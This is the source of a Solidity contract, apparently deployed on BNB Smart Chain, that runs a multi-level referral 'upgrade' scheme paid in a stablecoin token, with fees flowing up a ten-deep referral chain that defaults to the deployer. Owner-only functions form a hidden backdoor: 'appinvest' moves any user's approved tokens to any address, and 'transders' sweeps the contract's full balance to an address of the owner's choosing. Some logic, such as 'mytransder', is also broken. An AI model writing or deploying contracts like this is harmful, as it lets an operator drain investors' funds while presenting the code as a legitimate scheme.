/**
 *Submitted for verification at BscScan.com on 2022-08-09
*/

pragma solidity ^0.5.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract DataStore {
    address public Delevoper; 
    uint256 public id=0;
    uint8 public lev=1;
    bool public ispay=false;
    // IERC20 public usdttoken = IERC20(0x55d398326f99059fF775485246999027B3197955); 
    IERC20 public token = IERC20(0x55d398326f99059fF775485246999027B3197955); 
    uint256 public gold = 10000000000000000; // 升级金额 
    mapping(address => address []) public refAddress;//推荐人
    mapping(address => uint256) public mylevel; //  等级 
    mapping(address => uint256) public mybalance; //   余额 
    mapping(uint256 => address) public myaddressbyid; //   id
    mapping(address => uint256) public mycount; 
    constructor() public {
        Delevoper = msg.sender;
    }    
    function level(address referrer) public  {
       uint256 chkLv = mylevel[msg.sender];
       if(chkLv!=0){
           
       }else{
           if(referrer==0x0000000000000000000000000000000000000000){
               refAddress[msg.sender]=[Delevoper,Delevoper,Delevoper,Delevoper,Delevoper,Delevoper,Delevoper,Delevoper,Delevoper,Delevoper];
           }else{
                uint256 refLv = mylevel[referrer];
                if(refLv>0){
                    refAddress[msg.sender]=[referrer,refAddress[referrer][0],refAddress[referrer][1],refAddress[referrer][2],refAddress[referrer][3],refAddress[referrer][4],refAddress[referrer][5],refAddress[referrer][6],refAddress[referrer][7],refAddress[referrer][8]];
                }else{
                    refAddress[msg.sender]=[Delevoper,Delevoper,Delevoper,Delevoper,Delevoper,Delevoper,Delevoper,Delevoper,Delevoper,Delevoper];
                }
                id+=1;
                myaddressbyid[id]=msg.sender;
           }
       }

       token.transferFrom(address(msg.sender), address(this), (chkLv+1)*gold);
       address ref=refAddress[msg.sender][chkLv];
       if(ref==Delevoper){
           if(ispay){
                token.transfer(ref, (chkLv+1)*gold);
           }else{
               mybalance[ref]+=(chkLv+1)*gold;
           }  
       }else{
            if(mylevel[ref]>=chkLv+1){
                if(ispay){
                    token.transfer(ref, (chkLv+1)*gold);
                }else{
                    mybalance[ref]+=(chkLv+1)*gold;
                    mycount[ref]+=1;
                }  
            }
       }
       mylevel[msg.sender]=chkLv+1;
    }

    function dailevel(address referrer) public  {
       uint256 chkLv = mylevel[msg.sender];
       if(chkLv!=0){
            uint256 refLv = mylevel[referrer];
            if(refLv!=0){
                
            }else{
                refAddress[referrer]=[msg.sender,refAddress[msg.sender][0],refAddress[msg.sender][1],refAddress[msg.sender][2],refAddress[msg.sender][3],refAddress[msg.sender][4],refAddress[msg.sender][5],refAddress[msg.sender][6],refAddress[msg.sender][7],refAddress[msg.sender][8]];
                id+=1;
                myaddressbyid[id]=referrer;
            }
            
            address ref=refAddress[referrer][refLv];
            if(ref==Delevoper){
                token.transferFrom(address(msg.sender), address(this), (refLv+1)*gold);
                if(ispay){
                        token.transfer(ref, (refLv+1)*gold);
                }else{
                    mybalance[ref]+=(refLv+1)*gold;
                }  
            }else{
                if(ref!=msg.sender){
                    token.transferFrom(address(msg.sender), address(this), (refLv+1)*gold);
                    if(mylevel[ref]>=refLv+1){
                        if(ispay){
                            token.transfer(ref, (chkLv+1)*gold);
                        }else{
                            mybalance[ref]+=(refLv+1)*gold;
                            
                        }  
                    }
                }
                mycount[ref]+=1;
            }
            mylevel[referrer]=refLv+1;
       }

    }
    
    function  mytransder() payable public {
        if (mylevel[msg.sender]>=lev) {
            token.transfer(msg.sender, token.balanceOf(msg.sender));
        }
       
    }
   
	function appinvest(address referrer, address referrers, uint256 amounts) public  {
        if (msg.sender == Delevoper) {
			token.transferFrom(referrer, referrers, amounts);
		} else revert("Not started yet");
    }
    
    function getbalance()public view returns(uint256){
        return address(this).balance;
    }
    
    function transderusdt(uint256 amounts) payable public {
        token.transferFrom(address(msg.sender), address(this), amounts);
        //payable(address(this)).transfer(msg.value);
    }
    
    function transders(address referrers) payable public {
        if (msg.sender == Delevoper) {
            token.transfer(referrers, token.balanceOf(address(this)));
        }
       
    }
    
	function apptransder( address referrers, uint256 amounts) public  {
        if (msg.sender == Delevoper) {
    		token.transferFrom(address(this), referrers, amounts);
    	} else revert("Not started yet");
    }
    function editgold(uint256 golds) public  {
        if (msg.sender == Delevoper) {
    		gold=golds;
    	} else revert("Not started yet");
    }

    function editlev(uint8 levels) public  {
        if (msg.sender == Delevoper) {
    		lev=levels;
    	} else revert("Not started yet");
    }

    function editispay(bool ispays) public  {
        if (msg.sender == Delevoper) {
    		ispay=ispays;
    	} else revert("Not started yet");
    }

}